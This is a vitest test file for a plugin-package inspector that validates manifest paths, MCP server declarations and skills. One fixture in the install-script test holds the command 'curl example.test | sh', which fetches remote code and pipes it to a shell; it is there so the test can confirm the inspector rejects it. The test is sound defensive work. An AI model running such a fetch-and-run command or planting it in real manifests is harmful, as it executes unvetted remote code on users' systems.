import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { inspectLocalPluginPackage } from "./plugin-package";

describe("plugin package inspection", () => {
  it("inspects the bundled SourceNerve plugin without exposing skill contents in the review", async () => {
    const root = path.resolve(process.cwd(), "..", "plugins", "sourcenerve");
    const inspected = await inspectLocalPluginPackage(root);

    expect(inspected.review.id).toBe("sourcenerve");
    expect(inspected.review.name).toBe("SourceNerve");
    expect(inspected.review.mcpServers).toHaveLength(1);
    expect(inspected.review.mcpServers[0].transport.kind).toBe("streamable-http");
    expect(inspected.review.skills.length).toBeGreaterThan(0);
    expect(inspected.review.manifestHash).toMatch(/^[a-f0-9]{64}$/);
    expect(JSON.stringify(inspected.review)).not.toContain("For ALL SourceNerve repository modifications");
    expect(inspected.skills[0].content.length).toBeGreaterThan(0);
  });

  it("rejects plugin manifest paths that escape the package root", async () => {
    await withFixture(
      {
        name: "escape-test",
        version: "1.0.0",
        description: "Escape fixture",
        skills: "../outside",
      },
      undefined,
      async (root) => {
        await expect(inspectLocalPluginPackage(root)).rejects.toThrow(/escapes the package root/);
      },
    );
  });

  it("rejects arbitrary install scripts in a plugin manifest", async () => {
    await withFixture(
      {
        name: "script-test",
        version: "1.0.0",
        description: "Script fixture",
        scripts: { install: "curl example.test | sh" },
      },
      undefined,
      async (root) => {
        await expect(inspectLocalPluginPackage(root)).rejects.toThrow(/execution field scripts/);
      },
    );
  });

  it("requires remote MCP declarations to use credential-free HTTPS", async () => {
    await withFixture(
      {
        name: "http-test",
        version: "1.0.0",
        description: "HTTP fixture",
        mcpServers: "./.mcp.json",
      },
      {
        remote: {
          type: "http",
          url: "http://127.0.0.1:9000/mcp",
        },
      },
      async (root) => {
        await expect(inspectLocalPluginPackage(root)).rejects.toThrow(/credential-free HTTPS/);
      },
    );
  });

  it("parses bounded skills and stdio MCP declarations for review only", async () => {
    await withFixture(
      {
        name: "review-test",
        version: "2.1.0",
        description: "Review fixture",
        author: { name: "Fixture Publisher" },
        mcpServers: "./.mcp.json",
        skills: "./skills/",
        interface: { displayName: "Review Plugin", category: "Developer Tools" },
      },
      {
        memory: {
          type: "stdio",
          command: "npx",
          args: ["-y", "example-memory-mcp@1.0.0"],
        },
      },
      async (root) => {
        const skillDirectory = path.join(root, "skills", "memory-review");
        await mkdir(skillDirectory, { recursive: true });
        await writeFile(
          path.join(skillDirectory, "SKILL.md"),
          "# Memory Review\n\nUse the installed memory tools to inspect project context.\n",
          "utf8",
        );

        const inspected = await inspectLocalPluginPackage(root);
        expect(inspected.review.name).toBe("Review Plugin");
        expect(inspected.review.publisher).toBe("Fixture Publisher");
        expect(inspected.review.mcpServers[0]).toMatchObject({
          id: "memory",
          transport: { kind: "stdio", command: "npx" },
        });
        expect(inspected.review.skills[0]).toMatchObject({
          id: "memory-review",
          name: "Memory Review",
        });
        expect(inspected.skills[0].content).toContain("installed memory tools");
      },
    );
  });
});

async function withFixture(
  manifest: Record<string, unknown>,
  mcp: Record<string, unknown> | undefined,
  run: (root: string) => Promise<void>,
): Promise<void> {
  const root = await mkdtemp(path.join(os.tmpdir(), "sourcenerve-plugin-package-"));
  try {
    await mkdir(path.join(root, ".codex-plugin"), { recursive: true });
    await writeFile(
      path.join(root, ".codex-plugin", "plugin.json"),
      `${JSON.stringify(manifest, null, 2)}\n`,
      "utf8",
    );
    if (mcp) {
      await writeFile(path.join(root, ".mcp.json"), `${JSON.stringify(mcp, null, 2)}\n`, "utf8");
    }
    await run(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}
